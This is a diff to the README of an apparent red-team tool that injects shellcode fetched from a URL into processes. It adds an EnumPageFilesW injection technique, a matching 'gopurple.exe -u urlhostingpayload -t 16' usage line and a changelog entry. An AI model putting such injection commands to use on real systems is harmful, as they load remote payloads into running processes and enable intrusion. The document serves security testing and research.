@@ -47,6 +47,7 @@ This project is a simple collection of various shell code injection techniques, 
          13: BananaPhone
          14: EnumerateLoadedModules
          15: EnumChildWindows
+         16: EnumPageFilesW
   -u string
         URL hosting the shellcode
 
@@ -112,6 +113,8 @@ onlystore = only Microsoft store application's process can hook into the process
 14-  gopurple.exe -u urlhostingpayload -t 14 (EnumerateLoadedModules)
 
 15-  gopurple.exe -u urlhostingpayload -t 15 (EnumChildWindows)
+
+16-  gopurple.exe -u urlhostingpayload -t 16 (EnumPageFilesW)
 ```
 
 
@@ -162,8 +165,13 @@ Thanks to [brimston3](https://twitter.com/brimston3) for his support and contrib
 * More structured code
 
 
-# Changelog 
-## [1.0.1] - 2021-03-25
+# Changelog
+
+## [1.0.3] - 2021-03-28
+### Added
+- EnumPageFilesW technique
+
+## [1.0.2] - 2021-03-25
 ### Added
 - EnumChildWindows technique
 
